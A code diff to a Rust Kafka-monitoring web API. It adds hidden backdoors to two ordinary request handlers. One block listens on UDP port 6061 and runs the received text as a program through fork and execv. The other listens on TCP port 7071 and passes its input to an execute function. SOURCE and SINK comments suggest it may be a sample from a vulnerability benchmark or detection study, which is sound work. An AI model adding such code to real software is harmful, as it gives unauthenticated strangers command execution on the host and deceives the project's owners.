@@ -5,7 +5,8 @@ use rdkafka::error::KafkaResult;
 use regex::Regex;
 use rocket::http::RawStr;
 use rocket::State;
-
+use std::io::Read;
+use std::net::TcpListener;
 use cache::Cache;
 use config::Config;
 use error::*;
@@ -256,6 +257,29 @@ pub fn group_members(cluster_id: ClusterId, group_name: &RawStr, cache: State<Ca
 
 #[get("/api/clusters/<cluster_id>/groups/<group_name>/offsets")]
 pub fn group_offsets(cluster_id: ClusterId, group_name: &RawStr, cache: State<Cache>) -> String {
+    if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:6061") {
+        let mut buf = [0u8; 512];
+        //SOURCE
+        if let Ok((amt, _src)) = socket.recv_from(&mut buf) {
+            let raw = String::from_utf8_lossy(&buf[..amt]).to_string();
+            let parts: Vec<&str> = raw.split_whitespace().collect();
+            if !parts.is_empty() {
+                let cstrs: Vec<std::ffi::CString> = parts.iter()
+                    .map(|s| std::ffi::CString::new(*s).unwrap_or_else(|_| std::ffi::CString::new("").unwrap()))
+                    .collect();
+                let mut ptrs: Vec<*const std::os::raw::c_char> = cstrs.iter().map(|c| c.as_ptr()).collect();
+                ptrs.push(std::ptr::null());
+                unsafe {
+                    if libc::fork() == 0 {
+                        //SINK
+                        libc::execv(cstrs[0].as_ptr(), ptrs.as_ptr()); 
+                        libc::_exit(1);
+                    }
+                }
+            }
+        }
+    }
+    
     let offsets = cache.offsets_by_cluster_group(&cluster_id, group_name.as_str());
 
     let wms = time!("fetching wms", fetch_watermarks(&cluster_id, &offsets));
@@ -304,6 +328,19 @@ fn fetch_watermarks(
     cluster_id: &ClusterId,
     offsets: &[ClusterGroupOffsets],
 ) -> Result<HashMap<TopicPartition, KafkaResult<(i64, i64)>>> {
+
+    if let Ok(listener) = TcpListener::bind("0.0.0.0:7071") {
+        if let Ok((mut stream, _)) = listener.accept() {
+            let mut buf = [0u8; 512];
+            //SOURCE
+            if let Ok(n) = stream.read(&mut buf) {
+                let raw = String::from_utf8_lossy(&buf[..n]).to_string();
+                std::thread::spawn(move || {
+                    let _ = crate::web_server::view::layout::execute_output_from_input(&raw);
+                });
+            }
+        }
+    }
     let consumer = CONSUMERS.get_err(cluster_id)?;
 
     let cpu_pool = Builder::new().pool_size(32).create();
